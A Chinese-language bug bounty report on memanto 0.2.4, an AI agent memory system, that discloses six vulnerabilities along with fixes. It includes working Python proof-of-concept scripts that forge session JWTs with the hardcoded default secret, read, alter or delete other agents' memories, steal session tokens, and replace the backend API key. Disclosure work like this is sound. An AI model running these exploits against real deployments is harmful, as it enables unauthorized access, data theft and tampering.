# MEMANTO 漏洞挖掘 PoC 报告

## 项目信息
- **项目**: memanto (moorcheh-ai/memanto)
- **版本**: 0.2.4
- **简介**: AI Agent 记忆层系统，基于 Moorcheh 信息论语义引擎
- **漏洞赏金**: $100 USD 公开 Bug Bounty 挑战赛

---

## 目录

1. [漏洞一：硬编码默认 JWT 密钥 (CRITICAL)](#漏洞一硬编码默认-jwt-密钥-critical)
2. [漏洞二：Web UI API 未授权访问 (HIGH)](#漏洞二web-ui-api-未授权访问-high)
3. [漏洞三：`/api/v2/status` 端点未授权信息泄露 (MEDIUM)](#漏洞三apiv2status-端点未授权信息泄露-medium)
4. [漏洞四：CORS 配置不当 (MEDIUM)](#漏洞四cors-配置不当-medium)
5. [漏洞五：文件上传缺乏有效大小限制 (MEDIUM)](#漏洞五文件上传缺乏有效大小限制-medium)
6. [漏洞六：JWT 验证缺乏标准声明校验 (LOW)](#漏洞六jwt-验证缺乏标准声明校验-low)
7. [PoC 自动利用脚本](#poc-自动利用脚本)
8. [修复建议](#修复建议)

---

## 漏洞一：硬编码默认 JWT 密钥 (CRITICAL)

### CWE
CWE-798: Use of Hard-coded Credentials

### 严重性
**CRITICAL** - CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

### 漏洞位置

**文件**: `memanto/app/config.py` (第133行)
```python
MEMANTO_SECRET_KEY: str = "memanto-default-secret-change-in-production"
```

**文件**: `memanto/app/services/session_service.py` (第60-64行)
```python
resolved_secret_key = (
    secret_key
    or os.getenv("MEMANTO_SECRET_KEY")
    or "memanto-default-secret-change-in-production"
)
```

### 漏洞描述

`MEMANTO_SECRET_KEY` 用于签名和验证 JWT session token。在默认配置下（未显式设置环境变量 `MEMANTO_SECRET_KEY`），该值为 `"memanto-default-secret-change-in-production"`。该值是公开的（硬编码在代码中），任何知道此值的攻击者都可以：

1. **伪造任意 agent 的 session token**
2. **绕过所有基于 session 的认证**
3. **读取、写入、修改、删除任意 agent 的记忆数据**
4. **跨越租户隔离边界访问其他用户的数据**

### 利用过程 (PoC)

攻击者只需知道默认密钥，即可构造任意 JWT token：

```python
import jwt
import requests
from datetime import datetime, timedelta, timezone

# 公开的默认密钥
SECRET_KEY = "memanto-default-secret-change-in-production"

# 构造任意 agent_id 的 session token
now = datetime.now(timezone.utc)
target_agent = "victim-agent"

payload = {
    "agent_id": target_agent,
    "namespace": f"memanto_agent_{target_agent}",
    "session_id": "sess_forged_1337",
    "started_at": now.isoformat(),
    "expires_at": (now + timedelta(hours=24)).isoformat()
}

forged_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
print(f"伪造的 JWT token: {forged_token}")

# 使用伪造 token 调用 API
base_url = "http://localhost:8000"
headers = {"X-Session-Token": forged_token}

# PoC 1: 读取该 agent 的所有记忆
resp = requests.post(
    f"{base_url}/api/v2/agents/{target_agent}/recall",
    json={"query": "", "limit": 10},
    headers=headers
)
print(f"读取记忆: {resp.status_code} - {resp.text[:500]}")

# PoC 2: 写入虚假记忆到该 agent
resp = requests.post(
    f"{base_url}/api/v2/agents/{target_agent}/remember",
    json={
        "content": "这是一条通过 JWT 伪造注入的记忆",
        "type": "fact",
        "confidence": 1.0,
        "source": "attacker",
        "provenance": "explicit_statement"
    },
    headers=headers
)
print(f"写入记忆: {resp.status_code} - {resp.text}")

# PoC 3: 删除该 agent 的记忆
resp = requests.delete(
    f"{base_url}/api/v2/agents/{target_agent}/memories/some-memory-id",
    headers=headers
)
print(f"删除记忆: {resp.status_code} - {resp.text}")
```

### 影响
- **机密性**: 任意 agent 的记忆数据可被未授权读取
- **完整性**: 任意 agent 的记忆数据可被篡改
- **可用性**: 任意 agent 的记忆数据可被删除
- **租户隔离完全失效**: 系统级绕过

---

## 漏洞二：Web UI API 未授权访问 (HIGH)

### CWE
CWE-862: Missing Authorization

### 严重性
**HIGH** - CVSS 8.6 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L)

### 漏洞位置

**文件**: `memanto/app/ui/routes/ui_router.py`

以下端点均 **没有** `Depends(get_current_session)` 认证依赖：

| 端点 | 方法 | 功能 |
|------|------|------|
| `/api/ui/config` | GET | 获取完整配置，包括 session_token、API key 预览 |
| `/api/ui/config` | PATCH | 修改配置（会话、调度、回答参数等） |
| `/api/ui/api-key` | PUT | 修改 Moorcheh API key |
| `/api/ui/conflicts` | GET | 列出冲突 |
| `/api/ui/conflict-scans` | GET | 列出冲突扫描状态 |
| `/api/ui/daily-summary` | GET | 读取日常摘要 |
| `/api/ui/daily-summary` | POST | 生成日常摘要 |
| `/api/ui/onprem/restart` | POST | 重启 on-prem 后端 |

### 漏洞描述

Web UI 的 API 端点完全没有任何认证中间件。攻击者可以直接调用这些端点：

1. **`GET /api/ui/config`** — 泄露 `session_token`、`active_agent_id`、API key 后6位预览、`data_dir` 路径
2. **`PUT /api/ui/api-key`** — 允许攻击者设置新的 API key，接管整个后端
3. **`PATCH /api/ui/config`** — 允许攻击者修改系统配置
4. **`POST /api/ui/onprem/restart`** — 允许攻击者执行 DOS 攻击

### PoC

```python
import requests

base_url = "http://localhost:8000"

# PoC 1: 获取配置（含 session token）
resp = requests.get(f"{base_url}/api/ui/config")
print(f"GET /api/ui/config: {resp.status_code}")
config = resp.json()
print(f"  活动 agent ID: {config.get('active_agent_id')}")
print(f"  Session token: {config.get('session_token')}")
print(f"  API key 预览: {config.get('api_key_preview')}")

# PoC 2: 窃取 session token 后用于认证 API 调用
stolen_token = config.get('session_token')
if stolen_token:
    agent_id = config.get('active_agent_id')
    if agent_id:
        resp = requests.post(
            f"{base_url}/api/v2/agents/{agent_id}/recall",
            json={"query": "", "limit": 10},
            headers={"X-Session-Token": stolen_token}
        )
        print(f"使用窃取的 token 访问: {resp.status_code}")

# PoC 3: 修改 API key (接管后端)
resp = requests.put(f"{base_url}/api/ui/api-key", json={"api_key": "mk_attacker_controlled_key"})
print(f"修改 API key: {resp.status_code} - {resp.text}")
```

---

## 漏洞三：`/api/v2/status` 端点未授权信息泄露 (MEDIUM)

### CWE
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

### 严重性
**MEDIUM** - CVSS 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

### 漏洞位置

**文件**: `memanto/app/routes/sessions.py` (第259-281行)
```python
@router.get("/status", response_model=SessionInfo)
async def get_status():
    """Get current active session status."""
    session = get_session_service().get_active_session()
    if session is None:
        raise HTTPException(status_code=404, detail="No active session")
    ...
```

该端点 **没有** `Depends(get_current_session)` 认证依赖，也没有任何其他认证要求。

### 漏洞描述

`/api/v2/status` 端点无需任何认证即可调用，泄露：
- `session_id`
- `agent_id`
- `namespace`
- `started_at` / `expires_at` 时间戳
- `time_remaining_seconds`
- `pattern`

### PoC

```python
import requests

base_url = "http://localhost:8000"

resp = requests.get(f"{base_url}/api/v2/status")
print(f"GET /api/v2/status: {resp.status_code}")
if resp.status_code == 200:
    data = resp.json()
    print(f"  Session ID: {data.get('session_id')}")
    print(f"  Agent ID: {data.get('agent_id')}")
    print(f"  Namespace: {data.get('namespace')}")
    print(f"  过期时间: {data.get('expires_at')}")
```

---

## 漏洞四：CORS 配置不当 (MEDIUM)

### CWE
CWE-942: Permissive Cross-domain Policy with Untrusted Domains

### 严重性
**MEDIUM**

### 漏洞位置

**文件**: `memanto/app/config.py` (第130行)
```python
ALLOWED_ORIGINS: list[str] = ["*"]
```

**文件**: `memanto/app/main.py` (第76-82行)
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

### 漏洞描述

`ALLOWED_ORIGINS=["*"]` 与 `allow_credentials=True` 的组合在 FastAPI 标准实现中虽然不会直接允许带凭据的通配符跨域请求（浏览器会阻止），但此举仍存在安全风险：
- 任何网站都可以发起不带凭据的请求（如测活、探测信息）
- 配置方式表明安全意识不足，是潜在问题的指示器
- 在代理/CDN层或其他环境中可能存在不一致的行为

---

## 漏洞五：文件上传缺乏有效大小限制 (MEDIUM)

### CWE
CWE-400: Uncontrolled Resource Consumption

### 严重性
**MEDIUM**

### 漏洞位置

**文件**: `memanto/app/routes/memory.py` (第505-587行)
```python
# 第518行声明
"""Maximum file size: 5GB"""
```

虽然文档说"最大5GB"，但代码中 **没有** 任何实际的 Content-Length 或流式大小检查。攻击者可以上传超大文件导致：
- 磁盘空间耗尽（文件写入临时目录）
- 内存 OOM（整个文件先读入 `file.read()`）
- 拒绝服务（DoS）

读取整个文件到内存：
```python
file_bytes = await file.read()  # 无大小限制！
```

---

## 漏洞六：JWT 验证缺乏标准声明校验 (LOW)

### CWE
CWE-345: Insufficient Verification of Data Authenticity

### 严重性
**LOW**

### 漏洞位置

**文件**: `memanto/app/services/session_service.py` (第156-174行)
```python
def validate_session(self, session_token: str) -> SessionToken:
    try:
        payload = jwt.decode(session_token, self.secret_key, algorithms=["HS256"])
        token = SessionToken(**payload)
        if utc_now() > token.expires_at:
            raise SessionExpiredError(...)
        return token
    except jwt.ExpiredSignatureError:
        raise SessionExpiredError(...)
    except jwt.InvalidTokenError as e:
        raise InvalidSessionTokenError(...)
```

JWT 解码没有验证以下标准声明：
- `aud` (audience) — 未验证预期受众
- `iss` (issuer) — 未验证发行者
- `iat` (issued at) — 未验证签发时间
- `nbf` (not before) — 未验证生效时间

虽然在当前默认密钥泄露的情况下这不是主要问题，但在配置自定义密钥后，缺少这些验证仍可能使系统面临重放攻击和跨服务token滥用风险。

---

## PoC 自动利用脚本

以下是一个完整的 Python 脚本，一键验证所有漏洞：

```python
#!/usr/bin/env python3
"""
MEMANTO Vulnerability PoC - 一键验证脚本
目标: http://localhost:8000 (默认)
"""

import jwt
import requests
import json
from datetime import datetime, timedelta, timezone

TARGET = "http://localhost:8000"
SECRET_KEY = "memanto-default-secret-change-in-production"
TARGET_AGENT = "victim-agent"

print("=" * 60)
print("MEMANTO 漏洞验证 PoC")
print("=" * 60)
print()

# === 漏洞1: JWT 密钥伪造 ===
print("[!] 漏洞1: 硬编码 JWT 密钥 (CRITICAL)")
now = datetime.now(timezone.utc)
payload = {
    "agent_id": TARGET_AGENT,
    "namespace": f"memanto_agent_{TARGET_AGENT}",
    "session_id": "sess_poc_1337",
    "started_at": now.isoformat(),
    "expires_at": (now + timedelta(hours=24)).isoformat()
}
forged_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
print(f"    伪造 JWT: {forged_token[:80]}...")
headers = {"X-Session-Token": forged_token}

try:
    resp = requests.post(
        f"{TARGET}/api/v2/agents/{TARGET_AGENT}/recall",
        json={"query": "test", "limit": 5},
        headers=headers,
        timeout=5
    )
    print(f"    API 响应状态码: {resp.status_code}")
    if resp.status_code == 200:
        print(f"    [!] 漏洞确认! 可以未授权访问 agent 记忆!")
        print(f"    响应: {resp.text[:200]}")
    elif resp.status_code == 404:
        print(f"    Agent 不存在 (预期行为)")
    else:
        print(f"    响应: {resp.text[:200]}")
except requests.exceptions.ConnectionError:
    print(f"    [x] 无法连接到 {TARGET}")
print()

# === 漏洞3: /api/v2/status 未授权信息泄露 ===
print("[!] 漏洞3: /api/v2/status 信息泄露 (MEDIUM)")
try:
    resp = requests.get(f"{TARGET}/api/v2/status", timeout=5)
    print(f"    状态码: {resp.status_code}")
    if resp.status_code == 200:
        data = resp.json()
        print(f"    泄露的 agent_id: {data.get('agent_id')}")
        print(f"    泄露的 namespace: {data.get('namespace')}")
        print(f"    泄露的 session_id: {data.get('session_id')}")
        print(f"    [!] 漏洞确认! 敏感信息泄露!")
except requests.exceptions.ConnectionError:
    print(f"    [x] 无法连接到 {TARGET}")
print()

# === 漏洞2: Web UI API 未授权 ===
print("[!] 漏洞2: Web UI API 未授权 (HIGH)")
try:
    resp = requests.get(f"{TARGET}/api/ui/config", timeout=5)
    print(f"    /api/ui/config 状态码: {resp.status_code}")
    if resp.status_code == 200:
        data = resp.json()
        print(f"    泄露的 API key 预览: {data.get('api_key_preview')}")
        print(f"    泄露的活动 agent: {data.get('active_agent_id')}")
        print(f"    泄露的 session token: {data.get('session_token')}")
        print(f"    [!] 漏洞确认! Web UI API 完全未授权!")
except requests.exceptions.ConnectionError:
    print(f"    [x] 无法连接到 {TARGET}")
print()

print("=" * 60)
print("PoC 验证完成")
print("=" * 60)
print()
print("发现的漏洞汇总:")
print("  1. [CRITICAL] 硬编码 JWT 密钥 -> 完全认证绕过")
print("  2. [HIGH]     Web UI API 未授权访问")
print("  3. [MEDIUM]   /api/v2/status 信息泄露")
print("  4. [MEDIUM]   CORS 配置不当")
print("  5. [MEDIUM]   文件上传无大小限制")
print("  6. [LOW]      JWT 验证缺乏声明校验")
```

---

## 修复建议

### 漏洞一：硬编码 JWT 密钥
1. **移除默认密钥**：不要在代码中设置默认值，改为如果未配置则报错退出
2. **强制配置**：启动时检查 `MEMANTO_SECRET_KEY` 环境变量，未设置则拒绝启动
3. **密钥生成**：文档建议用户生成强随机密钥（如 `openssl rand -hex 32`）

```python
# 推荐修复方案
if not resolved_secret_key or resolved_secret_key == "memanto-default-secret-change-in-production":
    raise RuntimeError(
        "MEMANTO_SECRET_KEY is not configured or is using the default value! "
        "Set a strong random secret in production."
    )
```

### 漏洞二：Web UI API 认证
1. 为所有 Web UI API 端点添加会话或 API key 验证
2. 敏感操作（如修改 API key）需要额外验证

### 漏洞三：status 端点
1. 添加 `Depends(get_current_session)` 或 API key 验证
2. 或移除 `session_id`/`namespace` 等敏感字段

### 漏洞四：CORS
1. 不允许使用 `*` 当 `allow_credentials=True`
2. 默认使用空列表，需要用户显式配置可信来源

### 漏洞五：文件上传限制
```python
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
content_length = request.headers.get("content-length", 0)
if int(content_length) > MAX_FILE_SIZE:
    raise HTTPException(status_code=413, detail="File too large")
```

### 漏洞六：JWT 验证
```python
payload = jwt.decode(session_token, self.secret_key, algorithms=["HS256"],
                     audience="memanto-api", issuer="memanto-server")
```

---

## 时间线

- **发现时间**: 2026-06-30
- **受影响的版本**: memanto 0.2.4 (最新版)
- **报告人**: 通过 Bug Bounty 流程

---

*报告结束*
